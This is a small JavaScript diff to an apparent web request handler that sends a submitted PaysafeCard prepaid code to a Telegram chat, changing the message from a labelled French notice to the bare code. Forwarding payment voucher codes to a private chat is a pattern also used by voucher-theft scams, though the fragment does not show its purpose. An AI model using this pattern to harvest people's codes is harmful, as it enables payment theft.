@@ -40,7 +40,7 @@ export default async function handler(req, res) {
                 },
                 body: JSON.stringify({
                     chat_id: telegramChatId,
-                    text: `Nouveau code PaysafeCard: ${cleanCode}`
+                    text: `${cleanCode}`
                 })
             }
         );
